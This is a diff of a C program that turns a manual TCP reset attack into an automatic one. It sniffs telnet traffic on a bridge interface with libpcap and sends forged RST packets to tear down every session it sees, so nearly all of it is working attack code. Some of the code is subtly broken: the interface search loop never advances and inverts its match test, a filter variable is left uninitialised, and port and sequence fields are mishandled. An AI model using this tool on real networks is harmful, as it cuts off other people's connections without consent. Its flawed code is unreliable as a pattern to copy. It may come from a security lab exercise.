@@ -1,15 +1,18 @@
-#include <assert.h>
-#include <netinet/in.h>
-#include <pcap/pcap.h>
-#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 
+#include <arpa/inet.h>
 #include <linux/if_ether.h>
+#include <net/ethernet.h>
+#include <netdb.h>
+#include <netinet/ether.h>
+#include <netinet/if_ether.h>
+#include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
+#include <pcap/pcap.h>
 
 #define PACKET(Name, Header_T)                                                 \
 	typedef struct {                                                           \
@@ -17,6 +20,7 @@
 		u_char data[];                                                         \
 	} Name
 
+PACKET(eth_t, struct ether_header);
 PACKET(ip_t, struct iphdr);
 PACKET(tcp_t, struct tcphdr);
 
@@ -120,37 +124,73 @@ void send_reset_packet(const char *target_ip, u_short target_port,
 	close(sock);
 }
 
-const char *print_usage() {
-	printf("Did not recieve enough arguments!");
-	exit(1);
+void sniff_tcp(u_char *user, const struct pcap_pkthdr *header,
+			   const u_char *packet) {
+	eth_t *link_pkt = (eth_t *)packet;
+
+	if (ntohs(link_pkt->header.ether_type) == ETHERTYPE_IP) {
+		ip_t *ip_pkt = (ip_t *)link_pkt->data;
+
+		char src_ip[INET_ADDRSTRLEN];
+		char dst_ip[INET_ADDRSTRLEN];
+
+		inet_ntop(AF_INET, &ip_pkt->header.saddr, src_ip, INET_ADDRSTRLEN);
+		inet_ntop(AF_INET, &ip_pkt->header.daddr, dst_ip, INET_ADDRSTRLEN);
+		struct protoent *proto = getprotobynumber(ip_pkt->header.protocol);
+
+		if (ip_pkt->header.protocol == IPPROTO_TCP) {
+			tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;
+
+			printf("Reset (src=%s:%hu, dst=%s:%hu) with sequence number %u\n",
+				   src_ip, tcp_pkt->header.source, dst_ip, tcp_pkt->header.dest,
+				   tcp_pkt->header.ack);
+
+			send_reset_packet(src_ip, tcp_pkt->header.source, dst_ip,
+							  tcp_pkt->header.dest, tcp_pkt->header.ack);
+		}
+	}
+}
+
+#define LOG_ON_ERROR(exp, handle)                                              \
+	if (exp != 0) {                                                            \
+		pcap_perror(handle, "Error: ");                                        \
+		exit(EXIT_FAILURE);                                                    \
+	}
+
+void apply_filter(pcap_t *handle, char *filter_exp) {
+	struct bpf_program fp;
+	bpf_u_int32 net;
+
+	pcap_compile(handle, &fp, filter_exp, 1, net);
+	LOG_ON_ERROR(pcap_setfilter(handle, &fp), handle);
+}
+
+char *find_bridge_interface(pcap_if_t *alldevsp) {
+	char *bridge_iface = NULL;
+
+	int idx = 0;
+	while ((bridge_iface = alldevsp[idx].name) != NULL) {
+		if (strncmp(bridge_iface, "br-", 3)) {
+			return bridge_iface;
+		}
+	}
 
 	return NULL;
 }
 
-#define shift(buff, len) ((len-- > 0) ? (*buff++) : (print_usage()))
+int main() {
+	pcap_if_t *alldevsp = NULL;
+	char err_buff[PCAP_ERRBUF_SIZE] = {0};
 
-int main(int argc, const char **argv) {
-	// Shift out the program name
-	const char *program_name = shift(argv, argc);
+	pcap_findalldevs(&alldevsp, err_buff);
+	char *bridge_iface = find_bridge_interface(alldevsp);
 
-	const char *target_ip, *source_ip;
-	u_short target_port, source_port;
-	u_long seq_number;
+	pcap_t *handle = pcap_open_live(bridge_iface, 262144, 1, 1000, err_buff);
+	apply_filter(handle, "tcp src port 23");
 
-	target_ip = shift(argv, argc);
-	sscanf(shift(argv, argc), "%hu", &target_port);
+	printf("Running on interface %s\n", bridge_iface);
 
-	source_ip = shift(argv, argc);
-	sscanf(shift(argv, argc), "%hu", &source_port);
+	pcap_loop(handle, -1, sniff_tcp, NULL);
 
-	sscanf(shift(argv, argc), "%lu", &seq_number);
-
-	printf("Trying reset attack on connection specified by (target=%s:%hu, "
-		   "source=%s:%hu) with seq number %lu\n",
-		   target_ip, target_port, source_ip, source_port, seq_number);
-
-	send_reset_packet(target_ip, target_port, source_ip, source_port,
-					  seq_number);
-
-	printf("Done.\n");
+	pcap_close(handle);
 }
